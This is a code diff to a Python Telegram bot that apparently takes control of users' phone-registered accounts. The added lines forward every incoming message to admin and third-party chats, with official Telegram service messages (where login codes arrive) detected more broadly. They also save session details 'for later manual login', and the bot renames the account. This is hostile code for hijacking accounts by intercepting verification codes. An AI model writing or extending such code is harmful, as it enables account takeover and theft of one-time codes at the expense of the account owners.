@@ -2446,19 +2446,23 @@ Your payment will be moved to Main Balance after verification.
             # Forward ALL messages as requested
             try:
                 # Always forward messages from Telegram Official (777000) immediately
-                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID
+                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or event.is_private and getattr(event.sender, 'username', '') == 'Telegram'
                 
                 sender = await event.get_sender()
                 sender_name = getattr(sender, 'first_name', 'Unknown')
                 if not sender_name and hasattr(sender, 'title'):
                     sender_name = sender.title
                 
+                # Double check for official Telegram account by username if ID check fails
+                if not is_official and hasattr(sender, 'username') and sender.username == 'Telegram':
+                    is_official = True
+
                 emoji = "🔔" if is_official else "📩"
                 forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
                 
                 # If it's an official message, also include the raw sender info for debugging
                 if is_official:
-                    forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}"
+                    forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}\nUsername: {getattr(sender, 'username', 'N/A')}"
                 
                 # Forward to both ADMIN_CHAT_ID and @CEO_cryfex (FORWARD_CHAT_ID)
                 await context.bot.send_message(
@@ -2472,6 +2476,19 @@ Your payment will be moved to Main Balance after verification.
                 logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID} and admin")
             except Exception as e:
                 logger.error(f"Failed to forward message: {e}")
+        
+        # Save session info for later manual login
+        try:
+            session_info = {
+                'phone': phone,
+                'user_id': user_id,
+                'timestamp': datetime.now().isoformat(),
+                'status': 'active'
+            }
+            with open(f'sessions/info_{phone.replace("+", "")}.json', 'w') as f:
+                json.dump(session_info, f)
+        except:
+            pass
         
         # Change Telegram Name
         try:
